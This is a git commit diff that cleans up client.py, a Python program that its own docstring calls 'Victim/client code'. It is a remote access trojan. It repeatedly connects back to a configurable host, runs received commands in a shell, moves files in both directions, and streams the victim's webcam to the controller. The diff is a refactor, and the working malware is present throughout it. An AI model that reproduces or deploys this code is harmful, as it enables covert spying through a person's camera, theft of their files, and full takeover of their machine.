8399aa469d1cf8c914e9b95dc901e87a63d63bba
reharish <58879939+reharish@users.noreply.github.com>
2022-07-02 16:38:50 +0530

    Code Clean up.

--- client.py
+++ client.py
@@ -1,37 +1,27 @@
-import socket
-import os
+"""
+Filename : client.py
+Author : @SPR-Ideas
+Victim/client code
+USAGE : Need to change the LISTEN PORT and LISTEN_IP
+        as per your Preference.
+"""
+import os, sys
+import time
 import subprocess
-import cv2
 import threading
+
+import socket
+import cv2
 import pickle
-import time 
 
-client = socket.socket()
-IP = "localhost"
+# Change this:
+IP = 'localhost'
 PORT = 9000
-while True :
-    try :
-        client.connect((IP,PORT))
-        break
-    except:
-        time.sleep(1)
-        pass
 
-end = False
-
-def ext(socket ,vid):
-    global end
+def ext(socket ,vid, end=False):
     msg  = socket.recv(10).decode().strip()
     if msg == "end":
         end = True
-
-
-
-
-
-
-
-percent = int()
 
 def send_file(socket,file_name):
 	client = socket
@@ -58,7 +48,6 @@ def get_times(size):
 		times = 64
 	return times
 
-
 def get_file(client,filename):
     global percent ,get_pwd
     times = int()
@@ -71,7 +60,7 @@ def get_file(client,filename):
         print("downloading.."+" "*20+"["+st.ljust(20)+"]"+str(len(data))+"/"+file_size,end="\r")
         d = client.recv(times*1024)
         if not d:
-            break 
+            break
         percent = len(data)*100//int(file_size)
         data += d
         u = len(data)
@@ -79,49 +68,34 @@ def get_file(client,filename):
             data = data[:int(file_size)]
             print("downloading.."+" "*20+"["+st.ljust(20)+"]"+str(len(data))+"/"+file_size,end="\r")
             print()
-            break	
+            break
     with open(filename,'wb') as k:
         k.write(data)
-
-
-
-
 
 def live_cam(socket):
     global end
     client_socket = socket
-    
     vid = cv2.VideoCapture(0)
-    
     th = threading.Thread(target=ext,args=(client_socket,vid))
     th.start()
     while(vid.isOpened()):
         img,frame = vid.read()
-        
         a = pickle.dumps(frame)
         msg_len = str(len(a)).ljust(10).encode()
         client_socket.sendall(msg_len+a)
         if end :
             vid.release()
-			
-			#have to recive in multi thread
-
-
-
 
 class terminal:
     pwd =os.getcwd()
-    ter = os 
+    ter = os
     sub = subprocess
     def command(self,cmd):
-
         out = ''
-
         if 'cd' in cmd:
             cmd = cmd.split()[-1]
             try :
                 self.ter.chdir(str(cmd))
-                
             except :
                 out = "no such directory"
             self.pwd = self.ter.getcwd()
@@ -129,26 +103,19 @@ class terminal:
             out1 = self.sub.Popen(cmd,stdout=subprocess.PIPE,shell =True)
             out = out1.communicate()[0]
             out = out.decode()
-
         return out
 
-ter = terminal()
-
-
-
-while True:
+def main():
+    ter = terminal()
     client.send(str(len(ter.pwd)).ljust(10).encode())
     client.send(ter.pwd.encode())
-    
     msg_len = int(client.recv(10).decode())
     msg =  client.recv(msg_len).decode()
-
     if msg == "exit":
         client.close()
-        break
+        return False
     if msg == "livecam":
         live_cam(client)
-
     elif "download" in msg :
         file_name = msg.split("-")[1].strip()
         send_file(client,file_name)
@@ -156,10 +123,23 @@ while True:
         file_name = msg.split("-")[1].strip()
         get_file(client,file_name)
     else:
-
         out = ter.command(msg)
         out_len = str(len(out)).ljust(10).encode()
         client.send(out_len)
         client.send(out.encode())
 
-    
+
+if __name__ == "__main__":
+    client = socket.socket()
+    end = False
+    percent = 0
+    while True :
+        try :
+            client.connect((IP,PORT))
+            break
+        except:
+            time.sleep(1)
+            pass
+    while True:
+        main()
+    sys.exit(0)
